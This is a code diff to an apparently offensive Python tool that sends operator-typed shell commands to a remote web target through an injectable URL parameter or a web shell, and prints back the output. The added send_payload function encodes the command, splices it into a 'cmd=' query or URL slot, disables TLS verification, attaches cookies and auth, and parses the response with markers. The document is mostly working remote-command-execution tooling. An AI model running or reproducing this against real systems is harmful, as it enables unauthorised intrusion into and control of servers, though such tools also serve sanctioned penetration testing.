@@ -51,7 +51,7 @@ def http_server(port):
       conn.close()
       conn = None
     except Exception as e:
-      if args.debug:
+      if state.args.debug:
         sys.stderr.write("[!] Err. socket.error : %s\n" % e)
       pass
   sys.stdout.write("[*] HTTP Server stopped\n")
@@ -298,6 +298,7 @@ def cmd_http(cmd):
   return
 
 def cmd_marker(cmd):
+  print(cmd)
   ## set the marker for our rce payloads
   ## this will determine boundaries to split and clean output
   if len(cmd) == 1:
@@ -314,10 +315,12 @@ def cmd_marker(cmd):
   if action == "set":
     ## set the rest of the string as our marker
     cfg.marker = " ".join(cmd)
-    sys.stdout.write("[*] Payload output marker set\n")
+    sys.stdout.write("[*] Payload output marker set.\n")
   elif action == "out":
     cfg.marker_idx = [int(idx) for idx in cmd]
-    sys.stdout.write("[*] Marker indices set\n")
+    sys.stdout.write("[*] Marker indices set.\n")
+  else:
+    sys.stdout.write("[!] Bad marker param!\n")
   return
 
 def cmd_method(cmd):
@@ -395,6 +398,65 @@ def cmd_useragent(cmd):
   if len(cmd) > 1:
     cfg.headers['User-Agent'] = state.userinput[len(cmd[0])+1:]
   sys.stdout.write("[*] User-Agent set: %s\n" % cfg.headers['User-Agent'])
+  return
+
+def send_payload():
+  ## execute our command to the remote target
+  if state.exec_cmd:
+    cmd = state.userinput
+
+    ## let's run our input through our encoding plugins
+    if len(cfg.encode_chain):
+      try:
+        for enc in cfg.encode_chain:
+          cmd = plugins.plugins[enc].run(cmd)
+      except:
+        pass
+
+    ## validate the URL format
+    if '{}' in cfg.url:
+      query = cfg.url.replace('{}', cmd.strip())
+    else:
+      if '?' in cfg.url:
+        if 'cmd=' not in cfg.url:
+          query = cfg.url + '&cmd=' + cmd
+        else:
+          query = cfg.url.replace('cmd=', 'cmd=' + cmd)
+      else:
+        query = cfg.url + cmd.strip()
+    ## log debug info
+    if state.args.debug:
+      sys.stdout.write("[D] " + query + "\n")
+    try:
+      if cfg.method == "post":
+        r = requests.post(query, data=cfg.post_data, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
+      else:
+        r = requests.get(query, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
+      ## sanitize the output. we only want to see our commands if possible
+      output = ""
+      if cfg.marker:
+        buffer = r.text.split(cfg.marker)
+        if len(buffer) > 1:
+          for idx in cfg.marker_idx:
+            output = output + buffer[idx] + "\n"
+        else:
+          output = buffer[0]
+        ## strip trailing newlines
+        output = output.rstrip()
+      else:
+        output = r.text
+      ## display our results
+      sys.stdout.write(output + "\n")
+      if state.userinput == '_show_phpinfo':
+        file = 'phpinfo.html'
+        fp = open(file, 'w')
+        fp.write(output)
+        fp.close()
+        sys.stdout.write("[*] Output saved to '" + file + "'.\n")
+    except Exception as e:
+      sys.stderr.write("[!] Unable to make request to target.\n")
+      sys.stderr.write("[!]  * %s\n" % e)
+      sys.stdout.flush()
   return
 
 ############################################################
